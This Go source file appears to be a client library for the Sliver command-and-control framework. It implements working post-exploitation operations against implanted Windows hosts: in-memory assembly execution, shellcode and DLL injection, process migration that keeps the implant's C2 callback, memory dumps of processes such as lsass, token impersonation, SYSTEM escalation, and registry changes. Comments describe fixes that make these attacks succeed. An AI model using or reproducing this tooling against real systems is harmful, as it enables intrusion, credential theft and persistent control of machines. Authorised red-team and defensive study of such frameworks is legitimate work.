package sliver

import (
	"context"
	"encoding/base64"
	"fmt"
	"path/filepath"
	"time"

	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

// requestFor builds the commonpb.Request envelope for a session call.
//
// Timeout is in NANOSECONDS - the official client sends
// (seconds * time.Second) - 1. Leaving it unset makes the server fall back to
// its 30s minimum, which silently truncates anything slower than that. The gRPC
// deadline is deliberately one second shorter so the server times out first and
// returns a real error instead of the client giving up mid-stream.
func requestFor(sessionID string, op time.Duration) *commonpb.Request {
	deadline := op - time.Second
	if deadline < 0 {
		deadline = op
	}
	return &commonpb.Request{
		SessionID: sessionID,
		Timeout:   int64(deadline),
	}
}

// --- ExecuteAssembly — .NET assembly in-memory execution ---
type ExecAssemblyResult struct {
	Output string `json:"output"`
}

func (c *Client) ExecuteAssembly(sessionID string, assembly []byte, arguments, process string) (*ExecAssemblyResult, error) {
	if err := c.requireWindows(sessionID, ".NET assembly execution"); err != nil {
		return nil, err
	}
	ctx, cancel := c.rpcCtx(opTimeoutExt)
	defer cancel()
	resp, err := c.RPC.ExecuteAssembly(ctx, &sliverpb.ExecuteAssemblyReq{
		Assembly:  assembly,
		Arguments: []string{arguments},
		Process:   process,
		Request:   &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return nil, err
	}
	if resp.Response != nil && resp.Response.Err != "" {
		return nil, fmt.Errorf("%s", resp.Response.Err)
	}
	return &ExecAssemblyResult{Output: string(resp.Output)}, nil
}

// --- Sideload — DLL sideloading ---
type SideloadResult struct {
	Result string `json:"result"`
}

// Sideload converts a PE to shellcode on the server, injects it into a freshly
// spawned process, and returns what that payload printed.
//
// Kill is set, and that is what produces the output. The implant only reads the
// child's stdout on the way out:
//
//	if kill {
//	    waitForCompletion(threadHandle)
//	    cmd.Process.Kill()
//	    return stdoutBuff.String() + stderrBuff.String(), nil
//	}
//	return "", nil
//
// Without it every injection reported an empty result, which the console showed
// as "no output at all" -- a message that sends the operator looking at AV or a
// wrong path instead of at the flag that threw the output away. The process is
// killed after the payload finishes either way, so nothing is left running.
func (c *Client) Sideload(sessionID string, data []byte, processName, args, entryPoint string) (*SideloadResult, error) {
	ctx, cancel := c.rpcCtx(opTimeoutExt)
	defer cancel()
	resp, err := c.RPC.Sideload(ctx, &sliverpb.SideloadReq{
		Data:        data,
		ProcessName: processName,
		Args:        []string{args},
		EntryPoint:  entryPoint,
		Kill:        true,
		Request:     &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return nil, err
	}
	if resp.Response != nil && resp.Response.Err != "" {
		return nil, fmt.Errorf("%s", resp.Response.Err)
	}
	return &SideloadResult{Result: resp.Result}, nil
}

// --- SpawnDll — DLL injection ---
func (c *Client) SpawnDll(sessionID string, data []byte, processName, args, entryPoint string) (*SideloadResult, error) {
	if err := c.requireWindows(sessionID, "DLL injection"); err != nil {
		return nil, err
	}
	ctx, cancel := c.rpcCtx(opTimeoutExt)
	defer cancel()
	resp, err := c.RPC.SpawnDll(ctx, &sliverpb.InvokeSpawnDllReq{
		Data:        data,
		ProcessName: processName,
		Args:        []string{args},
		EntryPoint:  entryPoint,
		Kill:        true,
		Request:     &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return nil, err
	}
	if resp.Response != nil && resp.Response.Err != "" {
		return nil, fmt.Errorf("%s", resp.Response.Err)
	}
	return &SideloadResult{Result: resp.Result}, nil
}

// --- Migrate — process migration ---
//
// Two things have to be right or this fails on Windows:
//
//  1. Config must be non-nil (the server dereferences it) AND complete. The
//     server falls back to building a fresh shellcode from it, so an empty one
//     yields an implant with no OS, no arch and no C2 endpoint: it injects fine
//     and then never calls back. We rebuild the config the official client
//     derives from the live session (GetActiveSessionConfig).
//
//  2. Request.Timeout is in NANOSECONDS and the server falls back to a 30s
//     minimum when it is unset. Building the shellcode alone can outlast that,
//     so the gRPC deadline and the implant-side timeout are both set here.
func (c *Client) Migrate(sessionID string, pid uint32, procName string) error {
	if err := c.requireWindows(sessionID, "process migration"); err != nil {
		return err
	}
	sess, err := c.rawSession(sessionID)
	if err != nil {
		return err
	}
	ctx, cancel := c.rpcCtx(migrateTimeout)
	defer cancel()
	resp, err := c.RPC.Migrate(ctx, &clientpb.MigrateReq{
		Pid:      pid,
		ProcName: procName,
		Name:     sess.Name,
		Config:   sessionImplantConfig(sess),
		Request:  requestFor(sessionID, migrateInjectTimeout),
	})
	if err != nil {
		return err
	}
	if resp.Response != nil && resp.Response.Err != "" {
		return fmt.Errorf("%s", resp.Response.Err)
	}
	if !resp.Success {
		return fmt.Errorf("migration into pid %d was rejected by the implant", pid)
	}
	return nil
}

// rawSession fetches the full session proto, which carries the OS, arch,
// transport and active C2 that the migrate config has to reproduce.
func (c *Client) rawSession(sessionID string) (*clientpb.Session, error) {
	ctx, cancel := c.rpcCtx(opTimeout)
	defer cancel()

	sessions, err := c.RPC.GetSessions(ctx, &commonpb.Empty{})
	if err != nil {
		return nil, err
	}
	for _, s := range sessions.GetSessions() {
		if s.ID == sessionID {
			return s, nil
		}
	}
	return nil, fmt.Errorf("session %s not found", sessionID)
}

// sessionImplantConfig mirrors client/console.GetActiveSessionConfig so that a
// migrated implant comes up on the same C2 channel as the session it replaced.
func sessionImplantConfig(s *clientpb.Session) *clientpb.ImplantConfig {
	config := &clientpb.ImplantConfig{
		ID:                  s.ID,
		GOOS:                s.OS,
		GOARCH:              s.Arch,
		Debug:               true,
		Evasion:             s.Evasion,
		MaxConnectionErrors: uint32(1000),
		ReconnectInterval:   int64(60),
		Format:              clientpb.OutputFormat_SHELLCODE,
		IsSharedLib:         true,
		HTTPC2ConfigName:    "default",
		C2: []*clientpb.ImplantC2{
			{URL: s.ActiveC2, Priority: uint32(0)},
		},
	}

	// The generated implant only compiles in the transport the session actually
	// arrived over; without this the shellcode has no working C2 at all.
	switch s.Transport {
	case "mtls":
		config.IncludeMTLS = true
	case "http", "https", "http(s)":
		config.IncludeHTTP = true
	case "dns":
		config.IncludeDNS = true
	case "wg":
		config.IncludeWG = true
	case "namedpipe":
		config.IncludeNamePipe = true
	case "tcppivot":
		config.IncludeTCP = true
	}
	return config
}

// --- ProcessDump — dump process memory ---
//
// A full-memory minidump of a browser or lsass runs to hundreds of megabytes
// and streams back over the C2 channel, so it needs far more than the 30s the
// server falls back to. The dump is handed back as raw bytes rather than base64
// so the HTTP layer can stream it straight into a file download.
type ProcessDumpResult struct {
	Data []byte `json:"-"`
}

func (c *Client) ProcessDump(sessionID string, pid int32) (*ProcessDumpResult, error) {
	// Dumping is a Windows implant feature: the Linux and macOS implants have no
	// handler, so the RPC comes back as "unknown message type". Gate it here as
	// well as in the UI, so the failure names the platform instead of the protocol.
	if err := c.requireWindows(sessionID, "process dump"); err != nil {
		return nil, err
	}
	ctx, cancel := c.rpcCtx(dumpTimeout)
	defer cancel()
	resp, err := c.RPC.ProcessDump(ctx, &sliverpb.ProcessDumpReq{
		Pid:     pid,
		Timeout: int32(dumpTimeout / time.Second),
		Request: requestFor(sessionID, dumpTimeout),
	})
	if err != nil {
		return nil, err
	}
	if resp.Response != nil && resp.Response.Err != "" {
		return nil, fmt.Errorf("%s", resp.Response.Err)
	}
	if len(resp.Data) == 0 {
		// A release-build Windows implant reports a failed dump with an empty
		// error string, which would otherwise look like a 0-byte success.
		return nil, fmt.Errorf("the implant returned an empty dump for pid %d "+
			"(dumping needs SeDebugPrivilege and a readable target process)", pid)
	}
	return &ProcessDumpResult{Data: resp.Data}, nil
}

// --- Impersonate — impersonate a user ---
func (c *Client) Impersonate(sessionID, username string) error {
	if err := c.requireWindows(sessionID, "token impersonation"); err != nil {
		return err
	}
	ctx, cancel := c.rpcCtx(opTimeout)
	defer cancel()
	resp, err := c.RPC.Impersonate(ctx, &sliverpb.ImpersonateReq{
		Username: username,
		Request:  &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return err
	}
	if resp.Response != nil && resp.Response.Err != "" {
		return fmt.Errorf("%s", resp.Response.Err)
	}
	return nil
}

// --- MakeToken — create a token with credentials ---
func (c *Client) MakeToken(sessionID, username, password, domain string) error {
	if err := c.requireWindows(sessionID, "token creation"); err != nil {
		return err
	}
	ctx, cancel := c.rpcCtx(opTimeout)
	defer cancel()
	resp, err := c.RPC.MakeToken(ctx, &sliverpb.MakeTokenReq{
		Username: username,
		Password: password,
		Domain:   domain,
		Request:  &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return err
	}
	if resp.Response != nil && resp.Response.Err != "" {
		return fmt.Errorf("%s", resp.Response.Err)
	}
	return nil
}

// --- RevToSelf — revert impersonation ---
func (c *Client) RevToSelf(sessionID string) error {
	if err := c.requireWindows(sessionID, "token reversion"); err != nil {
		return err
	}
	ctx, cancel := c.rpcCtx(opTimeout)
	defer cancel()
	resp, err := c.RPC.RevToSelf(ctx, &sliverpb.RevToSelfReq{
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return err
	}
	if resp.Response != nil && resp.Response.Err != "" {
		return fmt.Errorf("%s", resp.Response.Err)
	}
	return nil
}

// --- GetSystem — Windows SYSTEM escalation ---
//
// Guard: sliver-server's GetSystem RPC dereferences req.Config.HTTPC2ConfigName
// without nil-checking Config, panicking (and crashing the server) when Config
// is nil. Always send a non-nil Config with the default HTTP C2 profile, mirroring
// the official client (getsystem.go).
func (c *Client) GetSystem(sessionID, hostingProcess string) error {
	if err := c.requireWindows(sessionID, "GetSystem"); err != nil {
		return err
	}
	ctx, cancel := c.rpcCtx(rpcSlow)
	defer cancel()
	resp, err := c.RPC.GetSystem(ctx, &clientpb.GetSystemReq{
		HostingProcess: hostingProcess,
		Config: &clientpb.ImplantConfig{
			HTTPC2ConfigName: "default",
		},
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return err
	}
	if resp.Response != nil && resp.Response.Err != "" {
		return fmt.Errorf("%s", resp.Response.Err)
	}
	return nil
}

// --- Ping — check session liveness ---
type PingResult struct {
	Nonce int32 `json:"nonce"`
}

func (c *Client) Ping(sessionID string) (*PingResult, error) {
	ctx, cancel := c.rpcCtx(rpcQuick)
	defer cancel()
	resp, err := c.RPC.Ping(ctx, &sliverpb.Ping{
		Nonce:   int32(time.Now().UnixNano() & 0x7FFFFFFF),
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return nil, err
	}
	if resp.Response != nil && resp.Response.Err != "" {
		return nil, fmt.Errorf("%s", resp.Response.Err)
	}
	return &PingResult{Nonce: resp.Nonce}, nil
}

// --- DeleteImplantBuild — delete a built implant ---
func (c *Client) DeleteImplantBuild(name string) error {
	ctx, cancel := c.rpcCtx(rpcDefault)
	defer cancel()
	_, err := c.RPC.DeleteImplantBuild(ctx, &clientpb.DeleteReq{Name: name})
	return err
}

// --- Regenerate — rebuild an implant without changing config ---
type RegenerateResult struct {
	Success bool   `json:"success"`
	Message string `json:"message"`
	Name    string `json:"name"`
	Data    string `json:"data"`
}

func (c *Client) Regenerate(implantName string) (*RegenerateResult, error) {
	ctx, cancel := c.rpcCtx(rpcLong)
	defer cancel()
	resp, err := c.RPC.Regenerate(ctx, &clientpb.RegenerateReq{ImplantName: implantName})
	if err != nil {
		return nil, err
	}
	// resp.File is optional: a regenerate can answer with no file at all (for
	// example when the build was already current). Reading .Name off a nil File
	// panicked the whole console, so both fields are read under the one guard.
	var data, name string
	if resp.File != nil {
		data = base64.StdEncoding.EncodeToString(resp.File.Data)
		name = resp.File.Name
	}
	if name != "" && filepath.Ext(name) == "" {
		name += implantFileExtension(c.configFromBuild(ctx, implantName))
	}
	return &RegenerateResult{
		Success: true,
		Message: fmt.Sprintf("regenerated %s", implantName),
		Name:    name,
		Data:    data,
	}, nil
}

// configFromBuild loads the stored implant config for a build so the filename
// can be completed with the correct platform extension.
func (c *Client) configFromBuild(ctx context.Context, implantName string) *clientpb.ImplantConfig {
	builds, err := c.RPC.ImplantBuilds(ctx, &commonpb.Empty{})
	if err != nil {
		return nil
	}
	return builds.Configs[implantName]
}

// --- GetOperators — list multiplayer operators ---
type OperatorView struct {
	Name   string `json:"name"`
	Online bool   `json:"online"`
}

func (c *Client) GetOperators() ([]OperatorView, error) {
	ctx, cancel := c.rpcCtx(rpcQuick)
	defer cancel()
	resp, err := c.RPC.GetOperators(ctx, &commonpb.Empty{})
	if err != nil {
		return nil, err
	}
	out := make([]OperatorView, 0, len(resp.Operators))
	for _, op := range resp.Operators {
		out = append(out, OperatorView{Name: op.Name, Online: op.Online})
	}
	return out, nil
}

// --- RegistryCreateKey — create a new registry key ---
func (c *Client) RegistryCreateKey(sessionID, hive, path, key string) error {
	if err := c.requireWindows(sessionID, "the Windows registry"); err != nil {
		return err
	}
	ctx, cancel := c.rpcCtx(opTimeout)
	defer cancel()
	resp, err := c.RPC.RegistryCreateKey(ctx, &sliverpb.RegistryCreateKeyReq{
		Hive:    hive,
		Path:    path,
		Key:     key,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return err
	}
	if resp.Response != nil && resp.Response.Err != "" {
		return fmt.Errorf("%s", resp.Response.Err)
	}
	return nil
}

// RegistryDeleteKey deletes a registry key or value on a windows session.
func (c *Client) RegistryDeleteKey(sessionID, hive, path, key string) error {
	if err := c.requireWindows(sessionID, "the Windows registry"); err != nil {
		return err
	}
	ctx, cancel := c.rpcCtx(opTimeout)
	defer cancel()
	resp, err := c.RPC.RegistryDeleteKey(ctx, &sliverpb.RegistryDeleteKeyReq{
		Hive:    hive,
		Path:    path,
		Key:     key,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return err
	}
	if resp.Response != nil && resp.Response.Err != "" {
		return fmt.Errorf("%s", resp.Response.Err)
	}
	return nil
}
